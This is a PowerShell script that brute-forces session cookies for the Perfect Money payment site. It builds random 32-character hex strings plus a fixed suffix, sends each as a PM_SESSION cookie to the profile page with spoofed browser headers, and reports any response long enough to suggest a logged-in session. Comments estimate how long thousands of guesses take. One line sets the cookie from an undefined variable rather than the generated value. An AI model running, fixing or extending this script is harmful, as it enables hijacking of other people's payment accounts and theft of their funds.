
$st=[System.Diagnostics.Stopwatch]::StartNew()
<#
creat hach with prin every hach
                               -1k=4.07 S
                               -10k=39  S    =>xk=4*x S
creat hach without prin every hach
                               -1k=2.6  S
                               -10k=26  S    =>xk=2.6*x S
-------------request timing
creat request with print hash-10=5 S
creat request without print hash +with if=-10=5.3 S
-----------------------------GITHUB*******************
1-creat request with print hash=>-10=9.54 S
2-creat request without print hash +with if=>-10=9.63 S
   *using2=>10      =9.63S
            100     =1.2 Mn
            1K      =13  Mn
            10k     =2h
            
*from hire CL#142
*--Github acsept only 20 Guates
#>
#===============================================================================================the hach lenth=32
#*the lenth of the random hash=32;the totall hach lenth=72


#---------------------------thestatic variables
$list=@(0,1,2,3,4,5,6,7,8,9,"a","b","c","d","e","f")
$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$session.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"

$LoginParameters = @{
    #Uri= "https://perfectmoney.com/profile.html" ;Method= 'GET';
    Uri= "https://perfectmoney.is/profile.html" ;Method= 'GET';
    Headers=@{
"Accept"="text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
  "Accept-Encoding"="gzip, deflate, br"
  "Accept-Language"="en-US,en;q=0.9,ar;q=0.8"
  "Cache-Control"="no-cache"
  "Pragma"="no-cache"
  "Referer"="https://perfectmoney.com/login.html"
  "Sec-Fetch-Dest"="document"
  "Sec-Fetch-Mode"="navigate"
  "Sec-Fetch-Site"="same-origin"
  "Sec-Fetch-User"="?1"
  "Upgrade-Insecure-Requests"="1"
  "sec-ch-ua"="`"Not?A_Brand`";v=`"8`", `"Chromium`";v=`"108`", `"Google Chrome`";v=`"108`""
  "sec-ch-ua-mobile"="?0"
  "sec-ch-ua-platform"="`"Windows`""
}
    }


#-------------------------------------start for
for($i=0;$i -le 10;$i++){
$i    

$v1=(Get-Random -InputObject $list).ToString();$v2=(Get-Random -InputObject $list).ToString();$v3=(Get-Random -InputObject $list).ToString();$v4=(Get-Random -InputObject $list).ToString();
$v5=(Get-Random -InputObject $list).ToString();$v6=(Get-Random -InputObject $list).ToString();$v7=(Get-Random -InputObject $list).ToString();$v8=(Get-Random -InputObject $list).ToString();$v9=(Get-Random -InputObject $list).ToString();
$v10=(Get-Random -InputObject $list).ToString();$v11=(Get-Random -InputObject $list).ToString();$v12=(Get-Random -InputObject $list).ToString();$v13=(Get-Random -InputObject $list).ToString();$v14=(Get-Random -InputObject $list).ToString();
$v15=(Get-Random -InputObject $list).ToString();$v16=(Get-Random -InputObject $list).ToString();$v17=(Get-Random -InputObject $list).ToString();$v18=(Get-Random -InputObject $list).ToString();$v19=(Get-Random -InputObject $list).ToString();
$v20=(Get-Random -InputObject $list).ToString();$v21=(Get-Random -InputObject $list).ToString();$v22=(Get-Random -InputObject $list).ToString();$v23=(Get-Random -InputObject $list).ToString();$v24=(Get-Random -InputObject $list).ToString();
$v25=(Get-Random -InputObject $list).ToString();$v26=(Get-Random -InputObject $list).ToString();$v27=(Get-Random -InputObject $list).ToString();$v28=(Get-Random -InputObject $list).ToString();$v29=(Get-Random -InputObject $list).ToString();
$v30=(Get-Random -InputObject $list).ToString();$v31=(Get-Random -InputObject $list).ToString();$v32=(Get-Random -InputObject $list).ToString();
$hash=$v1+$v2+$v3+$v4+$v5+$v6+$v7+$v8+$v9+$v10+$v11+$v12+$v13+$v14+$v15+$v16+$v17+$v18+$v19+$v20+$v21+$v22+$v23+$v24+$v25+$v26+$v27+$v28+$v29+$v30+$v31+$v32+"f0e4611272c1895b274e62291be04358942f846c"
#$hash
$session.Cookies.Add((New-Object System.Net.Cookie("PM_SESSION",$xxx, "/", "perfectmoney.com"))) #-------------------the variable

#----------the req


$userlogin=Invoke-WebRequest @LoginParameters -WebSession $session -ContentType "application/x-www-form-urlencoded"  -MaximumRedirection 0 -ErrorAction SilentlyContinue  
#true  Length >24400
#false Length <7500 7464
$resLenth=$userlogin.RawContent.Length;#$resLenth
if($resLenth -gt 7464){
   Write-Host '----------- ok +hash= '$hash
  }
}

$st.Elapsed
